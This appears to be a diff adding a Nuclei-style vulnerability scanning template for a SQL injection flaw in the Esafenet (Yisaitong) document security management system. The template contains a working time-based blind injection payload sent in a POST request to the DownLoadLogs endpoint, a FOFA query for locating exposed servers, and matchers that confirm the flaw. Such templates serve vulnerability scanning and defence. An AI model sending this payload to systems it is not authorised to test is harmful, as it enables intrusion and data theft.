@@ -1,0 +1,42 @@
+id: poc-yaml-yisaitong-esafenet-downloadlogs-sqli
+info:
+  name: 亿赛通电子文档安全管理系统 DownLoadLogs SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    finger: 亿赛通电子文档安全管理系统
+    fofa: app="亿赛通-电子文档安全管理系统"
+
+variables:
+  t1: "{{rand_int(3,8)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - raw:
+      - |
+        POST /CDGServer3/client/DecryptApplication;Servicelogin HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        isdeled=1'WAITFOR+DELAY'0%3a0%3a{{t1}}'--&isExam=&command=DownLoadLogs
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "filename=\"log.csv\""
+          - "Path=/CDGServer3"
+      - type: word
+        part: body
+        words:
+          - "客户端"
+          - "申请人"
+          - "审批人"
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
